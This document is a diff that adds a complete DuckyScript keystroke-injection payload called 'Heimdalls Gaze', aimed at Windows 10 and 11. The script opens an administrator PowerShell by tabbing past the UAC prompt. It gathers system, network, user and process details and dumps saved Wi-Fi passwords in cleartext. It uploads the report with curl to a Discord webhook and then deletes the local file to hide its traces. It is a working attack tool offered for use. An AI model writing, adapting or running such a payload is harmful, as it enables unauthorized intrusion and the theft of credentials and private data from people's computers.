@@ -1,0 +1,55 @@
+REM Title:        Heimdalls Gaze
+REM Author:       wino_willy and Gemini
+REM Description:  The definitive version. Gains full admin rights, opens a visible
+REM               PowerShell window, and reliably exfiltrates a clean, comprehensive
+REM               report.
+REM Target:       Windows 10 & 11
+
+REM --- PHASE 1: SEIZE ADMINISTRATIVE CONTROL ---
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 2500
+TAB
+DELAY 250
+TAB
+DELAY 250
+ENTER
+DELAY 3000
+
+REM --- PHASE 2: DELIVER THE FLAWLESS COMMANDS ---
+STRING $url='<Discord Web-Hook Here>';$file = "$env:TEMP\intel_report.txt";function Write-Header { param($Title) Write-Output "`n================== $Title ==================`n" | Out-File $file -Append };'HEIMDALL REPORT FOR ' + $env:COMPUTERNAME + ' - ' + (Get-Date) | Out-File $file
+ENTER
+STRING Write-Header -Title 'SYSTEM INFORMATION'; systeminfo | Out-File $file -Append
+ENTER
+STRING Write-Header -Title 'NETWORK CONFIGURATION'; ipconfig /all | Out-File $file -Append
+ENTER
+STRING Write-Header -Title 'ACTIVE CONNECTIONS & PROCESSES'; netstat -anob | Out-File $file -Append
+ENTER
+DELAY 1000
+STRING Write-Header -Title 'ROUTING TABLE'; route print | Out-File $file -Append
+ENTER
+STRING Write-Header -Title 'ARP CACHE'; arp -a | Out-File $file -Append
+ENTER
+STRING Write-Header -Title 'RUNNING PROCESSES (VERBOSE)'; tasklist /v | Out-File $file -Append
+ENTER
+STRING Write-Header -Title 'LOCAL USERS'; net user | Out-File $file -Append
+ENTER
+STRING Write-Header -Title 'SAVED WIFI CREDENTIALS';(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$n=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=`"$n`" key=clear)} | Select-String 'Key Content\W+\:(.+)$' | %{$p=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE=$n;PASSWORD=$p}} | Format-Table -AutoSize | Out-File $file -Append
+ENTER
+DELAY 1000
+STRING Write-Header -Title 'INSTALLED APPLICATIONS'; Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize | Out-File $file -Append
+ENTER
+DELAY 1000
+
+REM --- PHASE 3: EXFILTRATE AND VANISH ---
+STRING curl.exe -F "file1=@$file" -F "content=Final report delivered from $($env:COMPUTERNAME)" $url
+ENTER
+DELAY 5000
+STRING Remove-Item $file
+ENTER
+STRING exit
+ENTER
